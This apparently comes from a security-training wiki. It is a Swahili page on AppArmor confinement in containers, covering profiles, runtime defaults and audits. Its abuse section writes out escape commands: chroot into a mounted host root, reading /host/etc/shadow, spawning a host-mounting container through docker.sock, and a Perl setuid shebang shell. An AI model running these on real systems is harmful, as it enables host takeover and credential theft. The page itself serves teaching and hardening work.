# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

AppArmor ni mfumo wa **Mandatory Access Control** ambao unaweka vikwazo kupitia profaili za kila programu. Tofauti na ukaguzi wa jadi wa DAC, ambao unategemea sana umiliki wa mtumiaji na kundi, AppArmor inamruhusu kernel kutekeleza sera iliyounganishwa na mchakato mwenyewe. Katika mazingira ya container, hili ni muhimu kwa sababu workload inaweza kuwa na vibali vya kutosha vya jadi kujaribu kitendo na bado kukataliwa kwa sababu profaili yake ya AppArmor haikubali path husika, mount, tabia ya network, au matumizi ya capability.

Poini muhimu zaidi ya dhana ni kwamba AppArmor ni **path-based**. Inatoa hoja kuhusu ufikiaji wa filesystem kupitia kanuni za path badala ya kupitia lebo kama SELinux inavyofanya. Hii inaiifanya iwe rahisi kuielewa na yenye nguvu, lakini pia inamaanisha bind mounts na mpangilio mbadala wa path yanastahili kuzingatiwa kwa makini. Ikiwa yaliyomo kwenye host yanapatikana chini ya path tofauti, athari za sera zinaweza zisifanye kazi kama mwendeshaji alivyotarajia mwanzoni.

## Role In Container Isolation

Mapitio ya usalama ya container mara nyingi yanakoma kwa capabilities na seccomp, lakini AppArmor inaendelea kuwa muhimu baada ya ukaguzi huo. Fikiria container iliyo na haki zaidi kuliko inavyostahili, au workload iliyoihitaji capability moja ya ziada kwa sababu za uendeshaji. AppArmor bado inaweza kuzuia upatikanaji wa faili, tabia za mount, networking, na mifumo ya utekelezaji kwa njia zinazozuia njia ya matumizi mabaya wazi. Hii ndiyo sababu kuzima AppArmor "tu ili programu ifanye kazi" kunaweza kimyakimya kubadilisha usanidi wenye hatari kuwa mmoja unaoweza kutumiwa kikamilifu.

## Lab

Ili kuangalia kama AppArmor inafanya kazi kwenye host, tumia:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Ili kuona mchakato wa container wa sasa unaendeshwa chini ya nini:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Tofauti hiyo ni ya kufundisha. Katika kesi ya kawaida, mchakato unapaswa kuonyesha muktadha wa AppArmor uliounganishwa na profaili iliyochaguliwa na runtime. Katika kesi isiyofungwa, tabaka hiyo ya ziada ya vikwazo inaondoka.

Unaweza pia kukagua kile Docker kinachofikiria kimetumika:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Matumizi ya Runtime

Docker inaweza kutumia profile ya AppArmor ya chaguo-msingi au iliyobinafsishwa wakati mashine mwenyeji inaunga mkono. Podman pia inaweza kuingiliana na AppArmor kwenye mifumo inayotegemea AppArmor, ingawa kwenye distribusheni zinazomtanguliza SELinux, mfumo mwingine wa MAC mara nyingi unachukua nafasi kuu. Kubernetes inaweza kuonyesha sera za AppArmor kwa ngazi ya workload kwenye nodi ambazo kwa kweli zinaunga mkono AppArmor. LXC na mazingira ya container ya familia ya Ubuntu pia hutumia AppArmor kwa wingi.

Jambo la kivitendo ni kwamba AppArmor si "Docker feature". Ni sifa ya host-kernel ambayo runtimes kadhaa zinaweza kuamua kuitumia. Ikiwa mashine mwenyeji haikuunga mkono au runtime imeelekezwa kuendesha run unconfined, ulinzi unaodaiwa haukuwepo kwa kweli.

Kwenye mashine mwenyeji zinazoweza kutumia Docker na AppArmor, chaguo-msingi kinachojulikana zaidi ni `docker-default`. Profaili hiyo inatengenezwa kutoka kwenye template ya AppArmor ya Moby na ni muhimu kwa sababu inaelezea kwanini baadhi ya capability-based PoCs bado zinashindwa katika container ya chaguo-msingi. Kwa ujumla, `docker-default` inaruhusu networking ya kawaida, inakataza uandishi kwa sehemu kubwa ya `/proc`, inakataza upatikanaji wa sehemu nyeti za `/sys`, inazuia mount operations, na inapunguza ptrace ili isiwe primitive ya jumla ya kuchunguza host. Kuelewa msingi huo husaidia kutofautisha "kontena lina `CAP_SYS_ADMIN`" na "kontena linaweza kutumia uwezo huo dhidi ya kernel interfaces ninazojali".

## Usimamizi wa Profaili

Profaili za AppArmor kwa kawaida zinawekwa chini ya `/etc/apparmor.d/`. Kawaida ya kutaja majina ni kubadilisha slashes katika njia ya executable kwa dots. Kwa mfano, profaili ya `/usr/bin/man` kawaida huwekwa kama `/etc/apparmor.d/usr.bin.man`. Undani huu ni muhimu wakati wa ulinzi na tathmini kwa sababu mara utakapo jua jina la profaili iliyo hai, mara nyingi unaweza kupata faili inayolingana haraka kwenye mashine mwenyeji.

Amri muhimu za usimamizi upande wa mashine mwenyeji ni pamoja na:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Sababu amri hizi zina umuhimu katika marejeleo ya container-security ni kwamba zinaeleza jinsi profaili zinavyotengenezwa, kupakiwa, kubadilishwa kwenda complain mode, na kubadilishwa baada ya mabadiliko ya programu. Ikiwa mwendeshaji ana tabia ya kuhamisha profaili kwenye complain mode wakati wa kutatua matatizo na kusahau kurejesha enforcement, container inaweza kuonekana imelindwa katika nyaraka wakati kwa kweli inafanya kazi kwa uhuru mkubwa zaidi.

### Kujenga na Kusasisha Profaili

`aa-genprof` inaweza kufuatilia tabia ya programu na kusaidia kutengeneza profaili kwa njia ya mwingiliano:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` inaweza kuunda profile ya kiolezo ambayo baadaye inaweza kupakiwa na `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Wakati binary inabadilika na sera inahitaji kusasishwa, `aa-logprof` inaweza kucheza tena denials zilizopatikana katika logi na kusaidia mwendeshaji kuamua kama kuziruhusu au kuzikataa:
```bash
sudo aa-logprof
```
### Logs

Matukio ya kukataa ya AppArmor mara nyingi yanaonekana kupitia `auditd`, syslog, au zana kama `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Hii ni muhimu kiutendaji na kwa mashambulizi. Walinzi wanaitumia kuboresha profaili. Washambuliaji wanaitumia kujifunza ni njia gani hasa au operesheni gani inakataliwa na je AppArmor ndiye udhibiti unaozuia exploit chain.

### Kubaini Faili Halisi ya Profaili

Wakati runtime inaonyesha jina maalum la profaili ya AppArmor kwa container, mara nyingi ni muhimu kuoanisha jina hilo na faili ya profaili kwenye diski:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Hii ni hasa muhimu wakati wa ukaguzi upande wa host kwa sababu inaziba pengo kati ya "the container says it is running under profile `lowpriv`" na "the actual rules live in this specific file that can be audited or reloaded".

## Mipangilio isiyofaa

Kosa linaloonekana zaidi ni `apparmor=unconfined`. Wasimamizi mara nyingi huweka wakati wa debugging ya programu iliyoshindwa kwa sababu profile ilizuia kwa usahihi kitu hatarishi au kisichotarajiwa. Ikiwa flag inabaki katika production, tabaka nzima ya MAC kwa vitendo limeondolewa.

Shida nyingine ya kufifia ni kudhani bind mounts hazina madhara kwa sababu ruhusa za faili zinaonekana kawaida. Kwa kuwa AppArmor inategemea path-based, kufichua host paths chini ya maeneo tofauti ya mount kunaweza kuingiliana vibaya na path rules. Kosa la tatu ni kusahau kwamba jina la profile katika config file halimaanishi mengi ikiwa host kernel haitokiutekeleza AppArmor.

## Matumizi mabaya

Unapoondolewa AppArmor, operesheni ambazo awali zilikuwa zimetengwa zinaweza ghafla kufanya kazi: kusoma sensitive paths kupitia bind mounts, kufikia sehemu za procfs au sysfs ambazo zilipaswa kuwa ngumu zaidi kutumia, kufanya vitendo vinavyohusiana na mount ikiwa capabilities/seccomp pia zinaruhusu, au kutumia paths ambazo profile kwa kawaida ingezitenga. AppArmor mara nyingi ndio mekanismu inayofafanua kwa nini jaribio la breakout la msingi kwa capabilities "lingefanya kazi" kwa nadharia lakini bado linashindwa kwa vitendo. Ondoa AppArmor, na jaribio lile lile linaweza kuanza kufanikiwa.

Ikiwa unashuku AppArmor ndiyo kitu kikuu kinachozuia path-traversal, bind-mount, au mount-based abuse chain, hatua ya kwanza kawaida ni kulinganisha nini kinachopatikana ikiwa na bila profile. Kwa mfano, ikiwa host path imekwa mounted ndani ya container, anza kwa kuangalia kama unaweza kuipitia na kuisoma:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Ikiwa container pia ina capability hatari kama `CAP_SYS_ADMIN`, mojawapo ya vipimo vya vitendo zaidi ni kuangalia ikiwa AppArmor ndio udhibiti unaozuia mount operations au ufikiaji wa sensitive kernel filesystems:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Katika mazingira ambapo host path tayari inapatikana kupitia bind mount, kupoteza AppArmor kunaweza pia kugeuza tatizo la read-only information-disclosure kuwa direct host file access:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Madhumuni ya amri hizi si kwamba AppArmor peke yake inasababisha breakout. Ni kwamba mara AppArmor itakapoondolewa, njia nyingi za filesystem- na mount-based abuse zitakuwa zinaweza kujaribiwa mara moja.

### Mfano Kamili: AppArmor Imezimwa + Host Root Ime-mounted

Ikiwa container tayari ina host root bind-mounted kwenye `/host`, kuondoa AppArmor kunaweza kugeuza blocked filesystem abuse path kuwa host escape kamili:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Mara tu shell inapoendesha kupitia host filesystem, workload imefanikiwa kutoroka mipaka ya container:
```bash
id
hostname
cat /etc/shadow | head
```
### Mfano Kamili: AppArmor Imezimwa + Runtime Socket

Ikiwa kizuizi halisi kilikuwa AppArmor juu ya runtime state, socket iliyopachikwa inaweza kutosha kwa escape kamili:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Njia kamili inategemea sehemu ya mount, lakini matokeo ya mwisho ni sawa: AppArmor haizuizi tena upatikanaji wa runtime API, na runtime API inaweza kuzindua container inayoweza kuathiri mwenyeji.

### Full Example: Path-Based Bind-Mount Bypass

Kwa sababu AppArmor ni path-based, kulinda `/proc/**` hakutalinda moja kwa moja yaliyomo ya procfs ya mwenyeji wakati yanapofikiwa kupitia njia tofauti:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Madhara yanategemea hasa ni nini kimewekwa (mounted) na ikiwa njia mbadala pia bypasses udhibiti mwingine, lakini muundo huu ni mojawapo ya sababu zilizo wazi kabisa kwanini AppArmor inapaswa kutathminiwa pamoja na mount layout badala ya kutengwa.

### Full Example: Shebang Bypass

Sera za AppArmor wakati mwingine zinawalenga interpreter path kwa njia ambayo haizingatii kikamilifu utekelezaji wa script kupitia shebang handling. Mfano wa kihistoria ulihusisha kutumia script ambayo mstari wake wa kwanza unaelekeza kwenye confined interpreter:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Mfano wa aina hii ni muhimu kama ukumbusho kwamba nia ya profile na mantiki halisi ya utekelezaji zinaweza kutofautiana. Wakati ukikagua AppArmor katika mazingira ya container, interpreter chains na njia mbadala za utekelezaji zinastahili umakini maalum.

## Ukaguzi

Malengo ya ukaguzi haya ni kujibu maswali matatu kwa haraka: je, AppArmor imewezeshwa kwenye host, je, process ya sasa imefungwa, na je, runtime kwa kweli ilitumia profile kwa container hii?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Kinachovutia hapa:

- Ikiwa `/proc/self/attr/current` inaonyesha `unconfined`, workload haiwezi kunufaika na confinement ya AppArmor.
- Ikiwa `aa-status` inaonyesha AppArmor imezimwa au haijapakiwa, jina lolote la profile katika runtime config kwa kawaida ni kwa mwonekano tu.
- Ikiwa `docker inspect` inaonyesha `unconfined` au profile maalum isiyotegemewa, mara nyingi hiyo ndio sababu njia za kutumika vibaya juu ya filesystem au mount zinafanya kazi.

Ikiwa container tayari ina privileges zilizoinuliwa kwa sababu za uendeshaji, kuiacha AppArmor imewezeshwa mara nyingi hufanya tofauti kati ya exception iliyodhibitiwa na kushindwa kwa usalama kwa njia pana zaidi.

## Chaguo-msingi za Runtime

| Runtime / platform | Hali chaguo-msingi | Tabia chaguo-msingi | Udhoofishaji wa kawaida kwa mkono |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default on AppArmor-capable hosts | Inatumia profile ya AppArmor `docker-default` isipobadilishwa | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Inategemea host | AppArmor inaungwa mkono kupitia `--security-opt`, lakini chaguo-msingi halisi inategemea host/runtime na si ya ulimwengu wote kama profile ya `docker-default` iliyoelezwa na Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Chaguo-msingi kwa masharti | Ikiwa `appArmorProfile.type` haijaainishwa, chaguo-msingi ni `RuntimeDefault`, lakini hutumika tu wakati AppArmor imewezeshwa kwenye node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` ikiwa na profile dhaifu, nodes zisizo na msaada wa AppArmor |
| containerd / CRI-O under Kubernetes | Inafuata msaada wa node/runtime | Runtimes zinazoungwa mkono na Kubernetes kwa kawaida zinaunga mkono AppArmor, lakini utekelezaji halisi bado unategemea msaada wa node na mipangilio ya workload | Sawa na safu ya Kubernetes; usanidi wa moja kwa moja wa runtime pia unaweza kuruka AppArmor kabisa |

Kwa AppArmor, mabadiliko muhimu zaidi mara nyingi ni **host**, si tu runtime. Kuweka profile katika manifest hakutengenezi confinement kwenye node ambapo AppArmor haijawezeshwa.
